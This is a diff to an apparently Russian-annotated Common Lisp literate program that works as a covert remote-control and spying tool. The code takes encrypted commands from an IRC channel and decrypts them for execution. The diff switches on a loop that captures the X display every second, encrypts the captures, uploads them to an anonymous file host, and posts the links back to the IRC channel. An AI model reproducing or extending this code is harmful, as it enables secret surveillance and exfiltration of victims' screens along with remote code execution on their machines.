@@ -152,10 +152,7 @@
       (block irc-cmd-block
         (let* ((msg  (cadr (CL-IRC:ARGUMENTS param)))
                (src  (CL-IRC:SOURCE param))
-               (seed (handler-case (parse-integer (subseq src 1))
-                      (SB-INT:SIMPLE-PARSE-ERROR ()
-                        (return-from irc-cmd-block nil))))
-               (oct  (decrypt msg seed))
+               (oct  (decrypt msg *irc-sess*))
                (str  (handler-case
                          (flex:octets-to-string oct :external-format :utf-8)
                        (FLEXI-STREAMS:EXTERNAL-FORMAT-ENCODING-ERROR () nil))))
@@ -171,13 +168,13 @@
   ;;  (flex:string-to-octets
   ;;   "(defun snd () (bt:with-lock-held (*irc-lock*) (cl-irc:privmsg *irc-conn* *irc-chan* (format nil \"nfo:error\"))))"
   ;;   :external-format :utf-8)
-  ;;   3783969158)
+  ;;  3783987858)
 
   ;; (encrypt
   ;;  (flex:string-to-octets
   ;;   "(snd)"
   ;;   :external-format :utf-8)
-  ;;  3783969158)
+  ;;  3783987858)
 #+END_SRC
 
 ** Join to channel
@@ -189,10 +186,10 @@
 #+BEGIN_SRC lisp :noweb yes
   (defun irc-join ()
     (cl-irc:add-hook *irc-conn* 'cl-irc:IRC-PRIVMSG-MESSAGE #'irc-msg-hook)
-    (sleep 3)
+    (sleep 1)
     (bt:with-lock-held (*irc-lock*)
       (cl-irc:join *irc-conn* *irc-chan*))
-    (sleep 3)
+    (sleep 1)
     (bt:with-lock-held (*irc-lock*)
       (cl-irc:privmsg
        ,*irc-conn* *irc-chan*
@@ -214,60 +211,63 @@
   <<upload>>
 
   (defun save (frmt-filename-str dims image)
-    nil) ;; >>>>>>>>>>>>>>>>>>>>>
-    (let* ((height (car  dims))
-           (width  (* 8 (cadr dims)))
-           (unpacked-image (unpack-image image))
-           (png (get-png-obj width height unpacked-image :grayscale))
-           (png-seq (get-png-sequence png))
-           (png-len (length png-seq))
-           (base64 (encrypt png-seq *irc-sess*))
-           (decoded (decrypt2 base64 *irc-sess*))
-           (unk-filename (format nil frmt-filename-str
-                                 (format nil "~A-~A-~A-"
-                                         (gensym) *irc-sess* png-len))))
-      ;; (alexandria:write-string-into-file
-      ;;  base64 unk-filename :if-exists :supersede  :external-format :utf-8)
-      (with-open-file (file-stream unk-filename
+    (let* ((height     (car  dims))
+           (width      (cadr dims))
+           (png        (get-png-obj width height image :grayscale))
+           (png-seq    (get-png-sequence png))
+           (base64     (encrypt png-seq *irc-sess*))
+           (decoded    (decrypt base64 *irc-sess*))
+           (filename   (format nil frmt-filename-str
+                               (format nil "~A" (get-universal-time))))
+           (upload-ret (cl-json:decode-json-from-string
+                        (anon-file-upload filename base64)))
+           (link       (if (cdr (assoc :status upload-ret))
+                           (subseq (cdadr (cadadr (assoc :data upload-ret))) 20)
+                           nil))
+           (full-filename (format nil "FILE_~A_~A"
+                                  ,*irc-sess*
+                                  filename)))
+      (finish-output)
+      (with-open-file (file-stream full-filename
                                    :direction :output
                                    :if-exists :supersede
                                    :if-does-not-exist :create
                                    :element-type '(unsigned-byte 8))
         (write-sequence decoded file-stream)
-        (cl-irc:privmsg *irc-conn* *irc-chan* "qwe"))
-      ))
-
+        (cl-irc:privmsg *irc-conn* *irc-chan*
+                        (if link
+                            link
+                            upload-ret)))))
 
   (let ((prev)
         (cnt 9999))
     (defun shot ()
-      ;; (format t "~%::shot-func")
-      ;; (let* ((snap (pack-image (x-snapshot)))
-      ;;        (dims (array-dimensions snap)))
-      ;;   (if (> cnt 4)
-      ;;       (progn
-      ;;         (save "FILE~A" dims snap)
-      ;;         (setf prev snap)
-      ;;         (setf cnt 0))
-      ;;       ;; else
-      ;;       (let ((xored (make-array dims :element-type '(unsigned-byte 8))))
-      ;;         (do ((qy 0 (incf qy)))
-      ;;             ((= qy (car dims)))
-      ;;           (declare (type fixnum qy))
-      ;;           (do ((qx 0 (incf qx)))
-      ;;               ((= qx (cadr dims)))
-      ;;             (declare (type fixnum qx))
-      ;;             (setf (aref xored qy qx)
-      ;;                   (logxor (aref prev qy qx)
-      ;;                           (aref snap qy qx)))))
-      ;;         (save "FILE~ADIFF" dims xored)
-      ;;         (setf prev snap)
-      ;;         (incf cnt))))
+      (let* ((snap (pack-image (x-snapshot)))
+             (dims (array-dimensions snap)))
+        (if (> cnt 4)
+            (progn
+              (save "~A" dims snap)
+              (setf prev snap)
+              (setf cnt 0))
+            ;; else
+            (let ((xored (make-array dims :element-type '(unsigned-byte 8))))
+              (do ((qy 0 (incf qy)))
+                  ((= qy (car dims)))
+                (declare (type fixnum qy))
+                (do ((qx 0 (incf qx)))
+                    ((= qx (cadr dims)))
+                  (declare (type fixnum qx))
+                  (setf (aref xored qy qx)
+                        (logxor (aref prev qy qx)
+                                (aref snap qy qx)))))
+              (save (format nil "~~A_~A" cnt) dims xored)
+              (setf prev snap)
+              (incf cnt))))
       (sleep 1)
-      (shot)))
+      ;; (shot)
+      ))
 
   (shot)
-
 #+END_SRC
 
 ** X-Display
@@ -777,8 +777,7 @@ SIMD-операций.
                :cookie-jar cookie-jar
                :additional-headers new-headers
                :force-binary t)
-            (let* ((text (flex:octets-to-string body-or-stream :external-format :utf-8)))
-              (format t "~%<<~A>>" text)))))))
+            (flex:octets-to-string body-or-stream :external-format :utf-8))))))
 
   ;; (anon-file-upload "555f.txt" "the content")
 
@@ -829,6 +828,7 @@ SIMD-операций.
   (ql:quickload "cl-base64")
   (ql:quickload "prbs")
   (ql:quickload "cl-irc")
+  (ql:quickload "cl-json")
 
   ;; may be not needed
   <<save_and_load_png>>
